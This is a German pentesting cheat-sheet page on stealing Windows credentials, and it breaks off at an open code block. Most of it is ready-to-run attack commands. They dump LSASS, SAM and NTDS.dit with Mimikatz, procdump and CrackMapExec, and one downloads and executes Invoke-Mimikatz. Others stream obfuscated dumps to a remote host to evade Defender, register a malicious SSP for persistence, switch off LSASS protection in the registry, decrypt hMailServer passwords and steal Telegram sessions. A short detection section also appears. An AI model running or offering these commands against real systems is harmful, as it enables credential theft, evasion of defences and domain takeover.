# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldedaten mit Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Weitere Funktionen von Mimikatz findest du auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Erfahre hier mehr über mögliche Maßnahmen zum Schutz von Zugangsdaten.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Zugangsdaten auszulesen.**

## Zugangsdaten mit Meterpreter

Verwende das von mir erstellte [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **um auf dem Opfer nach Passwörtern und Hashes zu suchen**.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Mit diesem Tool kannst du den **lsass-Prozess dumpen**, den **Dump herunterladen** und die **Zugangsdaten lokal** aus dem Dump **extrahieren**.

Du kannst auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) ausgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Manche **AV** könnten die Verwendung von **procdump.exe zum Dump von lsass.exe** als **bösartig erkennen**, da sie die Zeichenfolgen **„procdump.exe“ und „lsass.exe“** erkennen. Es ist daher **unauffälliger**, als **Argument** die **PID** von lsass.exe an procdump zu **übergeben**, **anstatt** den **Namen lsass.exe** zu verwenden.

### Dump von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll** in `C:\Windows\System32` ist dafür zuständig, bei einem Absturz den **Prozessspeicher zu dumpen**. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die erste Komponente ist die Prozess-ID, deren Speicher gedumpt werden soll, die zweite gibt den Speicherort der Dump-Datei an und die dritte Komponente muss exakt das Wort **full** sein. Es gibt keine alternativen Optionen.\
Nachdem diese drei Komponenten ausgewertet wurden, erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
**comsvcs.dll** kann verwendet werden, um den lsass-Prozess zu dumpen, sodass procdump nicht hochgeladen und ausgeführt werden muss. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Der folgende Befehl wird zur Ausführung verwendet:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass mit Task Manager**

1. Klicke mit der rechten Maustaste auf die Taskleiste und klicke auf Task Manager.
2. Klicke auf More details.
3. Suche im Tab Processes nach dem Prozess "Local Security Authority Process".
4. Klicke mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicke auf "Create dump file".

### Dumping lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei und Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite.

Ein bereits vorhandener vollständiger System-Crash-Dump oder eine komprimierte Kopie in einem zugänglichen Benutzerordner kann Anmeldeinformationsmaterial für eine Offline-Analyse enthalten. Dateinamen wie `MEMORY.DMP` und `MEMORY.7z` sind lediglich Hinweise für eine Überprüfung: Verifiziere Herkunft und Zugriff und gehe nicht davon aus, dass sie verwendbare oder aktuelle Anmeldeinformationen enthalten.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das Speicher-Dumps verschleiern und auf Remote-Workstations übertragen kann, ohne sie auf der Festplatte abzulegen.

**Hauptfunktionen**:

1. Umgehen des PPL-Schutzes
2. Verschleiern von Speicher-Dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen von Speicher-Dumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless Dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-basiertes LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon setzt einen dreistufigen Dumper namens **LalsDumper** ein, der `MiniDumpWriteDump` nie aufruft. Daher werden EDR-Hooks für diese API nie ausgelöst:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – sucht in `fdp.dll` nach einem Platzhalter aus 32 kleinen `d`-Zeichen, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die schädliche DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 innerhalb von LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XOR-verknüpft jedes Byte mit `0x20` und mappt den dekodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – die gemappte Payload implementiert die MiniDump-Logik mit **direct syscalls** neu, die anhand gehashter API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt den Handle, damit die Exfiltration später erfolgen kann.

Hinweise für Operatoren:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 ersetzt den hartcodierten Platzhalter durch den absoluten Pfad zu `rtu.txt`; eine Trennung unterbricht daher die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst eintragen, damit LSASS den SSP bei jedem Start erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie dann Mimikatz/Volatility zur Extraktion von Zugangsdaten.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS transparent den bösartigen SSP und führt Stage 2 aus.
* Das Löschen der DLL von der Festplatte entfernt sie nicht aus LSASS. Lösche entweder den Registrierungseintrag und starte LSASS neu (Neustart) oder lasse ihn für langfristige Persistenz bestehen.

## CrackMapExec

### SAM-Hashes dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA-Secrets auslesen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### NTDS.dit vom Ziel-DC dumpen

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump die Passworthistorie aus NTDS.dit vom Ziel-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Das pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ befinden. Sie lassen sich jedoch **nicht einfach auf herkömmliche Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Am einfachsten lassen sich diese Dateien stehlen, indem man eine Kopie aus der Registry erstellt:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Lade** diese Dateien auf deinen Kali-Rechner herunter und **extrahiere die Hashes** mit:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Mit diesem Dienst können Sie geschützte Dateien kopieren. Sie benötigen Administratorrechte.

#### Mit vssadmin

Die vssadmin-Binärdatei ist nur in Windows-Server-Versionen verfügbar.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Aber du kannst dasselbe auch mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und die Datei wird unter C:\users\Public gespeichert), aber du kannst dies zum Kopieren jeder geschützten Datei verwenden:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich könntest du auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory-Anmeldedaten – NTDS.dit**

Die Datei **NTDS.dit** gilt als Herzstück von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. Hier werden die **Passwort-Hashes** von Domänenbenutzern gespeichert. Bei dieser Datei handelt es sich um eine Datenbank der **Extensible Storage Engine (ESE)**. Sie befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

Diese Datenbank enthält drei primäre Tabellen:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie erfasst Beziehungen, etwa Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Sicherheitsdeskriptoren** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Forschung zur Datenbankebene dokumentiert diese Tabellen und ihr versionsspezifisches Verhalten ausführlicher.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren; sie wird von _lsass.exe_ verwendet. Ein **Teil** der Datei **NTDS.dit** kann sich dann im Speicher von **`lsass`** befinden (wahrscheinlich sind dort die zuletzt aufgerufenen Daten zu finden, da zur Leistungssteigerung ein **Cache** verwendet wird).

#### Hashes in NTDS.dit entschlüsseln

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **Hash** mit dem **PEK** und **RC4** entschlüsseln.
3. Den **Hash** mit **DES** entschlüsseln.

Der **PEK** hat auf allen Domänencontrollern denselben **Wert**, ist aber in **NTDS.dit** mit dem domänencontrollerspezifischen **BOOTKEY** aus der **SYSTEM**-Hive dieses Domänencontrollers verschlüsselt. Um Anmeldedaten zu extrahieren, werden daher sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) benötigt.

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Du kannst auch den Trick mit [**volume shadow copy**](#stealing-sam-and-system) verwenden, um die Datei **ntds.dit** zu kopieren. Denk daran, dass du auch eine Kopie der **SYSTEM-Datei** benötigst (verwende erneut den Trick, sie [**aus der Registry zu dumpen oder volume shadow copy zu verwenden**](#stealing-sam-and-system)).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **beschafft** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Du kannst sie auch mit einem gültigen Domain-Admin-Benutzer **automatisch extrahieren**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich kannst du auch das **Metasploit-Modul** _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Secrets, sondern auch die gesamten Objekte und ihre Attribute extrahiert, um weitere Informationen abzurufen, sobald die rohe NTDS.dit-Datei bereits abgerufen wurde.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Die `SYSTEM`-Hive ist optional, ermöglicht aber die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Trust-Schlüssel sowie NT- und LM-Passworthistorien). Zusätzlich zu weiteren Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, der Baum der Organisationseinheiten und deren Mitgliedschaften, vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen ...

## Lazagne

Lade die Binärdatei [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Mit dieser Binärdatei kannst du Anmeldeinformationen aus verschiedenen Programmen extrahieren.

```
lazagne.exe all
```

## Weitere Tools zum Extrahieren von Zugangsdaten aus SAM und LSASS

### Windows Credentials Editor (WCE)

Mit diesem Tool können Zugangsdaten aus dem Arbeitsspeicher extrahiert werden. Laden Sie es herunter unter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Zugangsdaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Anmeldedaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Lade es von [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und **führe es einfach aus**. Die Passwörter werden dann extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetrie im Stil von DumpRDPHistory erfassen

* **Ausgehende RDP-Ziele** – analysiere jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Nachweise für eingehendes RDP** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Verbindung getrennt) ab, um zu ermitteln, wer das System administriert hat:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange seine **getrennte** Sitzung noch besteht. CredSSP + NTLM-Fallback hinterlassen seinen Verifier und seine Tokens in LSASS. Diese können dann über SMB/WinRM wiederverwendet werden, um `NTDS.dit` abzugreifen oder Persistenz auf Domain Controllern einzurichten.

### Registry-Downgrades, auf die FinalDraft abzielt

Dieselbe Implantation manipuliert außerdem mehrere Registry-Schlüssel, um den Diebstahl von Anmeldedaten zu erleichtern:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` deaktiviert Restricted Admin für eingehendes RDP; es aktiviert **nicht** pass-the-hash über diesen Modus. Wenn der Wert auf `0` gesetzt wird, ist Restricted Admin auf dem Ziel zulässig, aber der Client muss `/RestrictedAdmin` anfordern oder eine Richtlinie verwenden, die Restricted Admin voraussetzt.<sup>[[14]](#references)</sup> Ein Hash allein verleiht keine Administratorrechte auf einem Remote-System; siehe [Voraussetzungen für die RDP-Authentifizierung](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Tokenfilterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht dem DSRM-Administrator die Anmeldung, während der DC online ist, und gibt Angreifern damit ein weiteres integriertes Konto mit hohen Rechten.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz und macht den Speicherzugriff für Dump-Tools wie LalsDumper trivial.

## hMailServer-Konfigurationsanmeldedaten (nach der Kompromittierung)

Prüfe die genauen Konfigurationsdateien `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` und `C:\ProgramData\hMailServer\hMailServer.ini` entsprechend dem Installationslayout. Ein lesbarer, nicht leerer Wert für `[Security] AdministratorPassword=` ist ein hMailServer-Administrationspasswort-Hash; er ist kein Beleg für ein Windows-Administratorkennwort. Wenn diese Anmeldedaten wiederhergestellt werden, setzt jeder Wechsel zu einem Windows-Konto eine unabhängig verifizierte Wiederverwendung des Kennworts und entsprechende Anmelderechte voraus.

Bei Installationen mit einer SQL-CE-Datenbank schützt der separate Wert `[Database] Password=` in der INI-Datei die Datenbank. Bei älteren Installationen ist dieser Wert mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und Vertauschungen der Bytereihenfolge von 4-Byte-Wörtern Blowfish-verschlüsselt. Verwende den Hex-String aus der INI-Datei mit diesem Python-Snippet:<sup>[[2]](#references)</sup>

Stelle zunächst sicher, dass das aktuelle Konto sowohl die INI-Datei als auch die zugehörige SQL-CE-Datenbankdatei `.sdf` lesen kann. Das INI-Kennwort schützt die Datenbank; es ist von den darin gespeicherten Mailbox-Konto-Hashes getrennt. Untersuche oder aktualisiere eine **Kopie** einer verwendeten Datenbank, niemals die aktive Datei.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Mit dem Klartextpasswort die SQL-CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf aktualisieren, bevor die Hashes abgefragt werden:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die Spalte `accountpassword` verwendet das hMailServer-Hashformat (hashcat-Modus `1421`). Ein geknacktes Postfachpasswort ermöglicht nur dann einen Windows-Benutzer-Pivot, wenn dieses Passwort von einem lokalen/Domänenkonto wiederverwendet wird und dieses Konto die erforderlichen Rechte für die Remote-Anmeldung besitzt.

## Abfangen von LSA-Logon-Callbacks (LsaApLogonUserEx2)

Manche Tools erfassen **Klartext-Anmeldepasswörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Dabei wird der Callback des Authentifizierungspakets gehookt oder umschlossen, um Anmeldedaten **während der Anmeldung** (vor dem Hashen) zu erfassen und anschließend auf der Festplatte zu speichern oder an den Operator zurückzugeben. Dies wird häufig mit einem Hilfsprogramm umgesetzt, das in LSA injiziert oder dort registriert wird und dann jedes erfolgreiche interaktive Netzwerk-Logon-Ereignis mit Benutzername, Domäne und Passwort protokolliert.<sup>[[1]](#references)</sup>

Hinweise zum Betrieb:
- Erfordert lokale Administratorrechte/SYSTEM, um das Hilfsprogramm in den Authentifizierungspfad zu laden.
- Erfasste Anmeldedaten werden nur bei einer Anmeldung sichtbar (je nach Hook interaktive Anmeldung, RDP-, Dienst- oder Netzwerk-Logon).

## Gespeicherte Verbindungsanmeldedaten in SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert Informationen zu gespeicherten Verbindungen in einer benutzerspezifischen Datei namens `sqlstudio.bin`. Spezielle Dumper können die Datei analysieren und gespeicherte SQL-Anmeldedaten wiederherstellen. In Shells, die nur die Befehlsausgabe zurückgeben, wird die Datei häufig exfiltriert, indem sie Base64-kodiert und auf stdout ausgegeben wird.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Browser-Sitzungs- und Cookie-Diebstahl über das Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop-`tdata`-Sitzungsdiebstahl

Telegram Desktop speichert Autorisierungs- und Kontostatus in seinem **`tdata`**-Verzeichnis. Eine kopierte Sitzung kann mit kompatiblen Tools geladen werden, um sich ohne Kontopasswort zu authentifizieren, solange die Autorisierung gültig ist; wenn die Verschlüsselung lokaler Daten aktiviert ist, benötigt der Stealer auch den Passcode. Eine authentifizierte Sitzung kann dann Identitätsdaten, Dialog- und Mitgliedschaftsmetadaten, Nachrichten und herunterladbare Medien offenlegen.<sup>[[10]](#references)</sup>

### Auffinden und Beschaffung

Durchsuche sowohl installierte als auch portable Verzeichnisstrukturen; die Namen von Microsoft-Store-Paketen variieren. Ermittle daher Paketverzeichnisse, die `TelegramMessenge` enthalten, und überprüfe deren Unterverzeichnis `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Wenn gewöhnliche Lesezugriffe fehlschlagen und das Prozesstoken `SeBackupPrivilege` **bereits enthält und aktiviert**, bietet der backup-aware Zugriff eine Ausweichmöglichkeit; er verschafft dem Prozess weder das Privileg noch erhöht er dessen Rechte. `CreateFileW` mit `FILE_FLAG_BACKUP_SEMANTICS` kann Backup-/Wiederherstellungssemantik anfordern und Dateisicherheitsprüfungen umgehen, wenn die erforderlichen Token-Privilegien vorhanden sind. Das Flag allein hebt jedoch keine inkompatible Dateisperre auf.<sup>[[10]](#references)[[11]](#references)</sup>

Bei aktuell gesperrten Dateien kann eine **Volume Shadow Copy** erstellt und gelesen werden; bei durch ACLs blockierten Dateien verwendet `robocopy /B` den Backup-Modus und umgeht Datei- und Verzeichnis-ACLs.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ein auf Bandbreite bedachtes Implantat sendet möglicherweise zuerst nur eine Übersicht der Dateipfade, erhält eine Snapshot-ID sowie die Pfade, die bereits beim C2 gespeichert sind, und lädt nur fehlende Dateien hoch. Daher können auch kleine inkrementelle Übertragungen nach einer rekursiven `tdata`-Auflistung einen erfolgreichen Sitzungsdiebstahl darstellen.<sup>[[10]](#references)</sup>

### Erkennung und Eindämmung

Setzen Sie rekursiven Zugriff auf `tdata` durch einen Nicht-Telegram-Prozess mit aktivierter `SeBackupPrivilege`, Dateiöffnungen mit Backup-Semantik, VSS-Aktivitäten oder einem untergeordneten `robocopy.exe`-Prozess mit `/B` in Beziehung. Suchen Sie außerdem nach einer schnellen Auflistung sowohl von `%APPDATA%` als auch von `%LOCALAPPDATA%\Packages`, auf die ausgehende Verbindungen desselben Prozesses folgen. Beenden Sie nach einer Kompromittierung unter **Einstellungen → Geräte** (oder **Datenschutz & Sicherheit → Aktive Sitzungen**) nicht erkannte Sitzungen. Das Aktivieren der zweistufigen Verifizierung allein widerruft keine bereits gestohlene Autorisierung.<sup>[[10]](#references)[[13]](#references)</sup>

## Diebstahl von Passkeys / WebAuthn-Anmeldedaten aus Chrome unter Windows

Wenn Codeausführung als **betroffener Benutzer** auf einem Windows-Host mit **Chrome + mit Google Password Manager synchronisierten Passkeys** erlangt wird, sind Passkeys ein interessantes Post-Exploitation-Ziel, sogar **ohne Admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte

```text
